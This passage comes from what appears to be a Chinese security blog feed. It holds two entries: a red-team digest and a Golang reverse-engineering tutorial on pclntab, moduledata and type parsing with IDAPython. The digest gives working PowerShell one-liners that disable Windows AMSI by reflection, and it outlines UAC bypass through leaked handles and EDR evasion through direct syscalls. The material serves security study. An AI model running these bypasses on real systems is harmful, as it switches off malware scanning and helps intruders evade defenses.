rel="external">https://gist.github.com/shantanu561993/6483e524dc225a188de04465c8512909</a></p><ul><li>3.使amsi失效，通过设置System.Management.Automation.AmsiUtils的属性amsiInitFailed或者amsiContext使AMSI失效。</li></ul><p>[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)</p><p>Ref:<a href="https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1" target="_blank" rel="external">https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1</a></p><ul><li>使amsi失效，该方法会导致异常，而且windows已经针对部分字符串进行检测。但是可以混淆绕过。</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$mem</span> = [System.Runtime.InteropServices.Marshal]<span class="symbol">:</span><span class="symbol">:AllocHGlobal</span>(<span class="number">9076</span>)</div><div class="line">[Ref].Assembly.GetType(<span class="string">"System.Management.Automation.AmsiUtils"</span>).GetField(<span class="string">"amsiSession"</span>,<span class="string">"NonPublic,Static"</span>).SetValue(<span class="variable">$null</span>, <span class="variable">$null</span>);</div><div class="line">[Ref].Assembly.GetType(<span class="string">"System.Management.Automation.AmsiUtils"</span>).GetField(<span class="string">"amsiContext"</span>,<span class="string">"NonPublic,Static"</span>).SetValue(<span class="variable">$null</span>, [IntPtr]<span class="variable">$mem</span>)</div></pre></td></tr></table></figure><h2 id="0x04-Windows特权句柄利用分析"><a href="#0x04-Windows特权句柄利用分析" class="headerlink" title="0x04 Windows特权句柄利用分析"></a>0x04 Windows特权句柄利用分析</h2><ul><li><p><a href="https://mp.weixin.qq.com/s/VJEgxfcuDRKMGBdkrXyRlA" target="_blank" rel="external">这篇文章</a>所描述的是，通过Hunt系统中的高完整性级别的句柄，来进行ByPass UAC。其原理和之前推得一篇文章很相似。<br>那篇原理是通过拉起某些自动提升UAC权限的进程，然后通过dump进程句柄实现的。这篇是寻找高完整性句柄，并以此启动进程进行ByPassUAC。</p></li><li><p>再讲一下为什么只需要获取高完整性级别的Handle就可以进行ByPass UAC。ByPassUAC原理就是父子进程的完整性级别是继承的，在创建进程之前的CreateProcess函数，会设置一个名为STARTUPINFOEXW结构体。其保存了一些启动信息。当我们创建进程之前，提前设置STARTUPINFOEXW的lpAttributeList元素，就可以是新创建的进程具有使用泄露句柄的进程完整性级别。关于UpdateProcThreadAttribute用法，可以看这篇文章<a href="https://blog.csdn.net/linlin003/article/details/108864860" target="_blank" rel="external">https://blog.csdn.net/linlin003/article/details/108864860</a></p></li></ul><h2 id="0x05-探索Windows-内核中的系统调用"><a href="#0x05-探索Windows-内核中的系统调用" class="headerlink" title="0x05 探索Windows 内核中的系统调用"></a>0x05 探索Windows 内核中的系统调用</h2><ul><li><p>这篇文章主要讲的是通过syscall绕过EDR产品的原理，因为EDR或者杀毒软件通常会在一些敏感函数下Hook，部分杀软Hook的地方比较偏向应用层，因为内核层搞事情容易蓝屏，而syscall位于ntdll中的Nt*函数，通过直接调用Nt函数，这样就可以绕过部分杀毒软件。</p></li><li><p>目前来说，我比较看好的项目<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="external">SysWhisoers2 </a>，国内有大佬也总结了syscall几个很好的项目。<a href="https://tttang.com/archive/1464/#toc_syswhisoers2" target="_blank" rel="external">syscall的前世今生</a></p></li><li><p>但是，Syscall Bypass这种技术，目前对于普通使用者来说难度较大，因为Nt*更接近于底层，没有暴露的API接口使用，部分结构体甚至没有公布，只能通过Re的方法进行了解。所以，需要自己写一套Stub去调用Nt函数。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）&quot;&gt;&lt;a href=&quot;#0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）&quot; class=&quot;headerlink&quot; title=&quot;0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）&quot;&gt;&lt;/a&gt;0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://mp.weixin.qq.com/s/LN8k0J4lOn-ZV5LmDfSTBQ&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;每周蓝军技术推送（2022.4.9-4.15）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>Golang Reverse</title>
    <link href="https://findream.github.io/2021/11/02/Golang%20Reverse/"/>
    <id>https://findream.github.io/2021/11/02/Golang Reverse/</id>
    <published>2021-11-02T12:45:11.000Z</published>
    <updated>2022-04-30T09:41:16.137Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-idapython-调试"><a href="#0x00-idapython-调试" class="headerlink" title="0x00 idapython 调试"></a>0x00 idapython 调试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;配置好IDA 7.5 免安装版之后，可以正常使用idapython，但是在import idc会报错。修改<code>%IDA_7.5%\python\3\ida_idaapi.py</code>文件，在第80行，添加如下：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sys<span class="selector-class">.modules</span>[<span class="string">"__main__"</span>]<span class="selector-class">.IDAPYTHON_COMPAT_695_API</span> = True</div></pre></td></tr></table></figure></p><p>  <img src="http://hacky.wang/blog/20210711/opAdW5ctvdze.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在vscode添加插件idacode<br>    <img src="http://hacky.wang/blog/20210711/oAt11UWv7kxW.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在IDA pro 安装插件，在<a href="https://github.com/ioncodes/idacode/releases" target="_blank" rel="external">https://github.com/ioncodes/idacode/releases</a>处下载。解压到%IDAPATH%/plugins中。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;编辑 <code>idacode_utils/settings.py</code>，把 Python 的可执行文件路径改为自己电脑上 Python 的路径<br>    <img src="http://hacky.wang/blog/20210711/yo6yEXmAtGx2.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重新打开，在输出窗口就能看到是否成功，可能会提示缺少模块，可以通过Pip安装模块debugpy<br>    <img src="http://hacky.wang/blog/20210711/e6bruJAYtJnm.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 安装成功就是这样的。<br>    <img src="http://hacky.wang/blog/20210711/vIx9aM2Dq8tL.png?imageslim" alt="mark"></p><a id="more"></a><h2 id="0x01-idapython-函数"><a href="#0x01-idapython-函数" class="headerlink" title="0x01 idapython 函数"></a>0x01 idapython 函数</h2><h2 id="0x02-pclntab及如何定位pclntab"><a href="#0x02-pclntab及如何定位pclntab" class="headerlink" title="0x02 pclntab及如何定位pclntab"></a>0x02 pclntab及如何定位pclntab</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pclntab 全称为 Program Counter Line Table(程序计数器行数映射表)。对应汇编中，可以简单的理解为EIP。其结构体定义如下：<br><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> LineTable <span class="keyword">struct</span> &#123;</div><div class="line">Data []<span class="keyword">byte</span></div><div class="line">PC   <span class="keyword">uint64</span></div><div class="line">Line <span class="keyword">int</span></div><div class="line"></div><div class="line"><span class="comment">// This mutex is used to keep parsing of pclntab synchronous.</span></div><div class="line">mu sync.Mutex</div><div class="line"></div><div class="line"><span class="comment">// Contains the version of the pclntab section.</span></div><div class="line">version version</div><div class="line"></div><div class="line"><span class="comment">// Go 1.2/1.16 state</span></div><div class="line">binary      binary.ByteOrder</div><div class="line">quantum     <span class="keyword">uint32</span></div><div class="line">ptrsize     <span class="keyword">uint32</span></div><div class="line">funcnametab []<span class="keyword">byte</span></div><div class="line">cutab       []<span class="keyword">byte</span></div><div class="line">funcdata    []<span class="keyword">byte</span></div><div class="line">functab     []<span class="keyword">byte</span></div><div class="line">nfunctab    <span class="keyword">uint32</span></div><div class="line">filetab     []<span class="keyword">byte</span></div><div class="line">pctab       []<span class="keyword">byte</span> <span class="comment">// points to the pctables.</span></div><div class="line">nfiletab    <span class="keyword">uint32</span></div><div class="line">funcNames   <span class="keyword">map</span>[<span class="keyword">uint32</span>]<span class="keyword">string</span> <span class="comment">// cache the function names</span></div><div class="line">strings     <span class="keyword">map</span>[<span class="keyword">uint32</span>]<span class="keyword">string</span> <span class="comment">// interned substrings of Data, keyed by offset</span></div><div class="line"><span class="comment">// fileMap varies depending on the version of the object file.</span></div><div class="line"><span class="comment">// For ver12, it maps the name to the index in the file table.</span></div><div class="line"><span class="comment">// For ver116, it maps the name to the offset in filetab.</span></div><div class="line">fileMap <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">uint32</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于我们来说比较重要的主要是函数名称表和原文件表，我将其简单划分成了三个部分,分别是pclntab_header，func_tbl_entry，srcfile_tbl_entry：</p><ul><li>pclntab_header：这是pclntab的头部，包含pclntab的幻字，架构，以及字节宽度</li><li>func_tbl：存储了函数个数，以及函数的地址，函数的Function Struct结构的偏移组成的一个list</li><li>src_tbl:存储了src_file的个数，以及指向src_file字符串的地址的偏移<figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">type</span> <span class="title">pclntab</span></span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">   <span class="class"><span class="keyword">type</span> <span class="title">pclntab_header</span></span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class">   &#123;</span></div><div class="line">      <span class="comment">//sizeof(pclntab_header) == 8</span></div><div class="line">      DWORD Magic_Number  <span class="comment">//+0x00 幻字</span></div><div class="line">      WORD Unknow         <span class="comment">//+0x04 暂无他用</span></div><div class="line">      BYTE min_lc         <span class="comment">//+0x06 instruction size quantum  --&gt;1 为 x86, 4 为 ARM</span></div><div class="line">      BYTE ptr_sz         <span class="comment">//+0x07 size of uintptr ---&gt;32bit 的为 4，64 bit 的为 8</span></div><div class="line">   &#125;</div><div class="line">   <span class="class"><span class="keyword">type</span> <span class="title">func_tbl</span></span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class">   &#123;</span></div><div class="line">      DWORD NumOfFunc    <span class="comment">//+0x08 number of function</span></div><div class="line"></div><div class="line">      DWORD func_addr1   <span class="comment">//+0x0B address of function1</span></div><div class="line">      DWORD offset_of_funcstruct1 <span class="comment">//+0x0F offset of func struct</span></div><div class="line">      DWORD func_addr2   <span class="comment">//+0x0B address of function1</span></div><div class="line">      DWORD offset_of_funcstruct2 <span class="comment">//+0x0F offset of func struct</span></div><div class="line">      ............</div><div class="line">   &#125;</div><div class="line">   <span class="class"><span class="keyword">type</span> <span class="title">srcfile_tbl</span></span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class">   &#123;</span></div><div class="line">      DWORD NumOfScrFile</div><div class="line">      DWORD offset_of_srcfile1  <span class="comment">//+0x(sizeof(func_tbl)+ ptr_sz)</span></div><div class="line">      ..............</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pclntab_header结构是定位pclntab的关键，因为pclntab_header存在MagicNumber为0xFFFFFFFB，所以只需要在文件中遍历0xFFFFFFFB，以及确定min_lc或者ptr_sz值的有效性即可。<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># Traverse the <span class="keyword">data</span> segment to search <span class="keyword">for</span> the signature code <span class="number">0xFFFFFFFB</span></div><div class="line">curr_addr = mdata_seg_addr</div><div class="line"><span class="keyword">while</span> curr_addr &lt; idc.BADADDR:</div><div class="line">    <span class="keyword">if</span> idc.get_qword(read_mem(curr_addr,<span class="number">4</span>))&amp;<span class="number">0xFFFFFFFF</span> == <span class="number">0xFFFFFFFB</span>:</div><div class="line">        <span class="keyword">if</span> is_firstmoduledata(curr_addr):</div><div class="line">            first_moduledata_addr = curr_addr</div><div class="line">            <span class="keyword">return</span> first_moduledata_addr</div><div class="line">    curr_addr = curr_addr + <span class="number">1</span></div><div class="line"><span class="keyword">return</span> first_moduledata_addr</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;func_tbl除了NumOfFunc，剩下就是func_addr和offset_of_funcstruct1组成的一个list，而offset_of_funcstruct只是一个指向funcstruct的一个偏移。funcstruct真正的地址是pclntable的地址加上func_struct的偏移，同理，srcfile_tbl除了NumOfScrFile，也包含一个存储srcfilename偏移的list。同样的，指向srcfilename地址也是pclntable的地址加上srcfilename的偏移。<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attr">func_struct_addr</span> = pclntb_addr + func_struct_<span class="literal">off</span>set</div><div class="line"><span class="attr">srcfilename_addr</span> = pclntb_addr + src_filename_<span class="literal">off</span>set</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pclntab的地址是0x004CBA00，而第一个函数的funcstruct的偏移为0x387C，所以funcstruct的地址为pclntb_addr + func_struct_offset，即0x004CF27C。func_struct的结构如下.其中比较重要的是func_entry以及offset_funcname：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">typedef func_struct struct</div><div class="line">&#123;</div><div class="line">   <span class="built_in">DWORD</span> func_entry         //函数入口地址</div><div class="line">   <span class="built_in">DWORD</span> offset_funcname    //函数名称偏移</div><div class="line">   <span class="built_in">DWORD</span> args</div><div class="line">   <span class="built_in">DWORD</span> frame</div><div class="line">   <span class="built_in">DWORD</span> pcsp</div><div class="line">   <span class="built_in">DWORD</span> pcfile</div><div class="line">   <span class="built_in">DWORD</span> pcln</div><div class="line">   <span class="built_in">DWORD</span> nfuncdata</div><div class="line">   <span class="built_in">DWORD</span> npdata</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><pre><code>![mark](http://hacky.wang/blog/20210711/GPuCp5oCqaL3.png?imageslim)</code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_funcname是函数名称的偏移量，和func_struct一样，addr_funcname 是通过pclntab的地址加上offset_funcname的值得来，即<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">addr_funcname</span> = addr_pclntbl + <span class="literal">off</span>set_funcname</div></pre></td></tr></table></figure></p><h2 id="0x03-Moduledata及如何定位-First-Moduledata"><a href="#0x03-Moduledata及如何定位-First-Moduledata" class="headerlink" title="0x03 Moduledata及如何定位 First_Moduledata"></a>0x03 Moduledata及如何定位 First_Moduledata</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Module 中可以包含多个不同的 Package，而每个 Package 中可以包含多个目录和很多的源码文件。Moduledata结构如下：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">type</span> moduledata <span class="keyword">struct </span>&#123;</div><div class="line">    pclntable    []<span class="keyword">byte </span>   // pclntab <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   ftab         []functab // <span class="meta">function</span> table <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   filetab      []uint32  // source file table <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   findfunctab  uintptr</div><div class="line">    minpc, maxpc uintptr   // minpc: first <span class="built_in">pc</span>(<span class="meta">function</span>) <span class="keyword">address</span></div><div class="line"><span class="keyword"></span></div><div class="line"><span class="keyword"> </span>   text, etext           uintptr  // [<span class="meta">.text</span>] section start/<span class="meta">end</span> <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   <span class="keyword">noptrdata, </span>enoptrdata uintptr</div><div class="line">    <span class="meta">data</span>, edata           uintptr  // [<span class="meta">.data</span>] section start/<span class="meta">end</span> <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   <span class="keyword">bss, </span>ebss             uintptr  // [.<span class="keyword">bss] </span>section start/<span class="meta">end</span> <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   <span class="keyword">noptrbss, </span>enoptrbss   uintptr  // [.<span class="keyword">noptrbss] </span>section start/<span class="meta">end</span> <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   <span class="meta">end</span>, gcdata, gcbss    uintptr</div><div class="line">    types, etypes         uintptr  // types <span class="meta">data</span> start/<span class="meta">end</span> <span class="keyword">address</span></div><div class="line"><span class="keyword"></span></div><div class="line"><span class="keyword"> </span>   textsectmap []textsect</div><div class="line">    typelinks   []int32    // offset table for types</div><div class="line">    <span class="keyword">itablinks </span>  []*<span class="keyword">itab </span>   // interface table</div><div class="line"></div><div class="line">    ptab []ptabEntry</div><div class="line"></div><div class="line">    pluginpath <span class="keyword">string</span></div><div class="line"><span class="keyword"> </span>   pkghashes  []modulehash</div><div class="line">    modulename   <span class="keyword">string</span></div><div class="line"><span class="keyword"> </span>   modulehashes []modulehash</div><div class="line">    hasmain uint8 // <span class="number">1</span> <span class="meta">if</span> module contains the main <span class="meta">function</span>, <span class="number">0</span> otherwise</div><div class="line">    gcdatamask, gcbssmask <span class="keyword">bitvector</span></div><div class="line"><span class="keyword"> </span>   typemap <span class="meta">map</span>[typeOff]*_type // offset to *_rtype in previous module</div><div class="line">    <span class="keyword">bad </span><span class="keyword">bool </span>// module failed to load <span class="keyword">and </span>should <span class="keyword">be </span>ignored</div><div class="line"></div><div class="line">    next *moduledata</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显然可以看到，moduledata之间通过链表的形式进行链接，而在Go文件中，只有firstmoduledata才拥有完整的结构,其中，比较重要的结构主要是<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">pclntable</span>    <span class="selector-attr">[]</span><span class="selector-tag">byte</span>    <span class="comment">// pclntab address</span></div><div class="line"><span class="selector-tag">ftab</span>         <span class="selector-attr">[]</span><span class="selector-tag">functab</span> <span class="comment">// function table address</span></div><div class="line"><span class="selector-tag">filetab</span>      <span class="selector-attr">[]</span><span class="selector-tag">uint32</span>  <span class="comment">// source file table address</span></div><div class="line"><span class="selector-tag">types</span>, <span class="selector-tag">etypes</span>         <span class="selector-tag">uintptr</span>  <span class="comment">// types data start/end address</span></div><div class="line"><span class="selector-tag">typelinks</span>   <span class="selector-attr">[]</span><span class="selector-tag">int32</span>    <span class="comment">// offset table for types</span></div><div class="line"><span class="selector-tag">itablinks</span>   <span class="selector-attr">[]</span>*<span class="selector-tag">itab</span>    <span class="comment">// interface table</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由此看来，针对Go逆向，首先就是需要寻找firstmoduledata，因为他包含了主要可以使用的信息，functble srcfiletble typelink等等。很显然，firstmoduledata第一个成员就是pclntable，只要定位到了pclntable就可以定位到firstmoduledata。</p><h2 id="0x04-Type介绍与解析"><a href="#0x04-Type介绍与解析" class="headerlink" title="0x04 Type介绍与解析"></a>0x04 Type介绍与解析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Go存在多种数据类型，有以bool,int等为代表的Basic Type(基本数据类型)，和以array，slice等为代表的复杂数据类型。而这些数据类型都是以一个名为<code>rtype</code>为基础的结构体拓展而来。如果是一些包括bool在内的简单数据类型，rtype就可以简单概括，如果是一些复杂的数据类型，则需要在rtype的基础上进行拓展而来。<br>    <img src="http://hacky.wang/blog/20210711/90Xma6V7D6yO.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上节，在介绍firstmoduledata结构的时候，存在firstmoduledata.typelinks成员以及firstmoduledata.typenumber成员，typelinks是一个存储着type的offset的list，而type_addr是firstmoduledata.typeaddr加上这些偏移所得到的。typenumber则表征着有多少个type。<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">type_addr</span> = self.first_moduledata.types_addr + type_<span class="literal">off</span>set</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>    <img src="http://hacky.wang/blog/20210711/INGj8IHxFtz4.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210711/tBfxXYQes1Uk.png?imageslim" alt="mark"></p><h3 id="0x04-1-rtype-解析"><a href="#0x04-1-rtype-解析" class="headerlink" title="0x04-1 rtype 解析"></a>0x04-1 rtype 解析</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rtype表征一个简单的数据结构，其他类型都是从其拓展而来。rtype结构如下：<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> rtype struct &#123;</div><div class="line">    size       uintptr</div><div class="line">    ptrdata    uintptr  // number <span class="keyword">of</span> bytes <span class="keyword">in</span> the <span class="keyword">type</span> that can contain pointers</div><div class="line">    hash       <span class="built_in">uint32</span>   // hash <span class="keyword">of</span> <span class="keyword">type</span>; avoids computation <span class="keyword">in</span> hash tables</div><div class="line">    tflag      tflag    // extra <span class="keyword">type</span> information flags</div><div class="line">    align      <span class="built_in">uint8</span>    // alignment <span class="keyword">of</span> variable <span class="keyword">with</span> this <span class="keyword">type</span></div><div class="line">    fieldAlign <span class="built_in">uint8</span>    // alignment <span class="keyword">of</span> struct field <span class="keyword">with</span> this <span class="keyword">type</span></div><div class="line">    kind       <span class="built_in">uint8</span>    // enumeration <span class="keyword">for</span> C</div><div class="line">    alg        *typeAlg // algorithm table</div><div class="line">    gcdata     *byte    // garbage collection data</div><div class="line">    str        nameOff  // <span class="built_in">string</span> form</div><div class="line">    ptrToThis  typeOff  // <span class="keyword">type</span> <span class="keyword">for</span> <span class="built_in">pointer</span> to this <span class="keyword">type</span>, may be zero</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中比较重要的结构如下：</p><ul><li>kind:表示变量的类型，其与KIND_MASK进行<strong>按位与</strong>操作得到的值才可以表示变量的类型，而KIND_MASK = (1 &lt;&lt; 5) - 1<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">type_kind = kind &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">5</span>) - <span class="number">1</span>)</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type_kind其实作为一个枚举类型存在,比如type_kind 为36，则表示是一个Ptr类型。<br><figure class="highlight julia"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> Kind uint</div><div class="line"><span class="keyword">const</span> (</div><div class="line">    Invalid Kind = iota</div><div class="line">    <span class="built_in">Bool</span></div><div class="line">    <span class="built_in">Int</span></div><div class="line">    <span class="built_in">Int8</span></div><div class="line">    <span class="built_in">Int16</span></div><div class="line">    <span class="built_in">Int32</span></div><div class="line">    <span class="built_in">Int64</span></div><div class="line">    Uint</div><div class="line">    Uint8</div><div class="line">    Uint16</div><div class="line">    Uint32</div><div class="line">    Uint64</div><div class="line">    Uintptr</div><div class="line">    <span class="built_in">Float32</span></div><div class="line">    <span class="built_in">Float64</span></div><div class="line">    <span class="built_in">Complex64</span></div><div class="line">    <span class="built_in">Complex128</span></div><div class="line">    <span class="built_in">Array</span></div><div class="line">    Chan</div><div class="line">    Func</div><div class="line">    Interface</div><div class="line">    Map</div><div class="line">    <span class="built_in">Ptr</span></div><div class="line">    Slice</div><div class="line">    <span class="built_in">String</span></div><div class="line">    Struct</div><div class="line">    UnsafePointer</div><div class="line">)</div></pre></td></tr></table></figure></p><ul><li>str：表示指向变量名的offset:offset加上typeaddr的地址就是typename的地址</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">name_addr</span> = type_addr+name_<span class="literal">off</span>set</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 值得注意的是，type name并不是一个单纯的string类型，而是是一个type_name 结构体<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">typedef type_name struct</div><div class="line">&#123;</div><div class="line">   <span class="built_in">flag</span>: <span class="comment">//是否可以导出,带有tag或者pkgpath</span></div><div class="line">   length  <span class="comment">//name长度</span></div><div class="line">   <span class="built_in">name</span>    <span class="comment">//string类型</span></div><div class="line">&#125;</div><div class="line">如果<span class="built_in">flag</span> &amp; <span class="built_in">Name</span>.MASK_EXPORTED ！=<span class="number">0</span> 说明可以被导出</div><div class="line">如果<span class="built_in">flag</span> &amp; <span class="built_in">Name</span>.MASK_FOLLOWED_BY_TAG !=<span class="number">0</span>，说明带有tag</div><div class="line">如果<span class="built_in">flag</span> &amp; <span class="built_in">Name</span>.MASK_FOLLOWED_BY_PKGPATH，说明带有pkgpath</div></pre></td></tr></table></figure></p><h3 id="0x04-2-Ptr-解析"><a href="#0x04-2-Ptr-解析" class="headerlink" title="0x04-2 Ptr 解析"></a>0x04-2 Ptr 解析</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为rtype.kind表征着type的类型，所以，在解析完rtype，判断一下kind，然后在去解析对应的复杂变量结构体即可。<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"># <span class="type">Ptr</span> <span class="type">Type</span></div><div class="line"><span class="title">if</span> <span class="type">RType</span>.<span class="type">TYPE_KINDS</span>[r<span 